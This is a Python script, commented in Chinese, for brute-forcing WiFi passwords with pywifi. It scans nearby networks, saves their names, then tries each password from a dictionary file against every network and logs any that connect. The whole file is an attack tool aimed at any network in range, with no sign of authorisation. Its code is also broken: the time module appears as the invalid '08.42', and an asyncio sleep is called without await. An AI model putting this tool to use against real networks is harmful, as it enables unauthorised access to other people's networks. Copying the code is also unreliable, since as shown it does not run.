# coding:utf-8
# coding:gbk
import 08.42  #时间
import pywifi  #破解wifi
# noinspection PyUnresolvedReferences
from pywifi import const  #引用一些定义
# noinspection PyUnresolvedReferences
from asyncio.tasks import (sleep)
# 需要第三方库 pywifi  (python3 pip install pywifi)
# 功能： 
#      1、扫描周围wifi列表 将ssid写入文本
#      2、读取密码字典进行匹配
class PoJie():
    def __init__(self,ssidfile,pwdfile,resfile): # 类初始化
        self.resfile = resfile # 破解结果文本文件
        self.pwdfile  = pwdfile  # 密码字典文本文件
        self.ssidfile = ssidfile # wifi的ssid列表文件
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]#抓取第一个无线网卡
        self.iface.disconnect() #测试链接断开所有链接
        08.42.sleep(1) #休眠1秒
        #测试网卡是否属于断开状态，
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
    def readPassWord(self,wifissid):  # 读取密码字典，进行匹配
            # noinspection PyUnresolvedReferences
            print("开始破解： %s"%wifissid)
            # 将结果写入文本文件记录
            res = "开始破解：: %s \n"%wifissid;
            # noinspection PyUnresolvedReferences
            open(self.resfile,"a").write(res)
            # noinspection PyUnresolvedReferences
            pwdfilehander=open(self.pwdfile,"r",errors="ignore")
            while True:
                try:
                    myStr =pwdfilehander.readline()
                    if not myStr:
                        break
                    bool1=self.test_connect(myStr,wifissid)
                    if bool1:
                        # print("密码正确："+myStr)
                        # res = "密码:%s 正确 \n"%myStr;
                        res = "===正确=== ^_^ wifi名:%s  匹配密码：%s "%(wifissid,myStr);
                        # noinspection PyUnresolvedReferences
                        print(res)
                        # 将结果写入文本文件记录
                        # noinspection PyUnresolvedReferences
                        open(self.resfile,"a").write(res)
                        break
                    else:
                        # print("密码:"+myStr+"错误")
                        res = "---错误--- wifi名:%s匹配密码：%s"%(wifissid,myStr);
                        # noinspection PyUnresolvedReferences
                        print(res)
                        # 将结果写入文本文件记录
                        # noinspection PyUnresolvedReferences
                        open(self.resfile,"a").write(res)
                    sleep(3)
                except:
                    continue
    # 读取wifi的ssid列表、读取密码字典，进行匹配
    def foreachPassWord(self):  
            # noinspection PyUnresolvedReferences
            print("^_^开始读取wifi的ssid列表...")
            # noinspection PyUnresolvedReferences
            ssidfilehander=open(self.ssidfile,"r",errors="ignore")
            ssidStrs =ssidfilehander.readlines()
            # print(ssidStrs)
            # noinspection PyUnresolvedReferences
            for index in range(len(ssidStrs)):
                self.readPassWord(ssidStrs[index])
            # noinspection PyUnresolvedReferences
            print("执行完毕! ^_^")
    # 扫描周边wifi列表 并写入文本中（一行一个）
    def scans_wifi_list(self):  # 扫描周围wifi列表
        #开始扫描
        # noinspection PyUnresolvedReferences
        print("^_^ 开始扫描附近wifi...")
        self.iface.scan()
        08.42.sleep(15)
        #在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        #统计附近被发现的热点数量
        # noinspection PyUnresolvedReferences
        nums = len(scanres)
        # print("|SCAN GET %s"%(nums))
        # noinspection PyUnresolvedReferences
        print("数量: %s"%(nums))
        # 在控制台表格输出 扫描列表
        # 表格 标题行
        # print ("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
        # noinspection PyUnresolvedReferences
        print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # 实际数据
        self.show_scans_wifi_list(scanres)
        return scanres
    def show_scans_wifi_list(self,scans_res):  # 显示扫描周围wifi列表
        #开始扫描
        # self.scans_wifi_list()
        # noinspection PyUnresolvedReferences
        for index,wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            # noinspection PyUnresolvedReferences
            print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
        # noinspection PyUnresolvedReferences
        print("^_^ 扫描结束. ^_^")
        # noinspection PyUnresolvedReferences
        print("^_^ 先预览. ^_^")
        # noinspection PyUnresolvedReferences
        for index,wifi_info in enumerate(scans_res):
            res = "%s\n"%wifi_info.ssid; # wifi的ssid名
            # noinspection PyUnresolvedReferences
            print(res)
        # noinspection PyUnresolvedReferences
        print("^_^ 预览结束. ^_^")
        # noinspection PyUnresolvedReferences
        print("^_^ 开始写入... ^_^")
        # noinspection PyUnresolvedReferences
        for index,wifi_info in enumerate(scans_res):
            res = "%s\n"%wifi_info.ssid; # wifi的ssid名
            # 将wifi的ssid名写入文本文件记录
            # ssidfilehandle = open(self.ssidfile,"a").write(res)
            # noinspection PyUnresolvedReferences
            open(self.ssidfile,"a").write(res)
        # noinspection PyUnresolvedReferences
        print("^_^ 写入结束. ^_^")
        # ssidfilehandle.close()
    def test_connect(self,findStr,wifissid):#测试链接
        profile = pywifi.Profile()  #创建wifi链接文件
        #profile.ssid ="e2" #wifi名称
        # profile.ssid ="1104" #wifi名称
        # profile.ssid ="1601" #wifi名称
        profile.ssid =wifissid #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码
        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        08.42.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True   
        else:
            isOK=False
        self.iface.disconnect() #断开
        08.42.sleep(1)
        #检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK
    # def __del__(self):
    #     ssidfilehandle.close()


# 类写完
# 开始执行
# 引入 配置参数 绝对路径写法
# pwdfile  = r"C:\Users\XieZhenBin\Desktop\wifipasswd.txt" # 密码字典文本路径
# resfile  = r"C:\Users\XieZhenBin\Desktop\pjRes.txt"      # 结果文本文件保存路径
# ssidfile = r"C:\Users\XieZhenBin\Desktop\ssidfile.txt"   # wifi的ssid的列表保存路径

# 引入 配置参数 相对路径写法
pwdfile  = r"wifi_passwd.txt"      # 密码字典文本路径
resfile  = r"pj_res.txt"           # 结果文本文件保存路径
ssidfile = r"wifi_ssid_list.txt"   # wifi的ssid的列表保存路径


start = PoJie(ssidfile,pwdfile,resfile) #实例化类

# 扫描周边wifi列表
start.scans_wifi_list()

# 读取密码字典、读取wifi的ssid列表、将结果写入文本文件
start.foreachPassWord()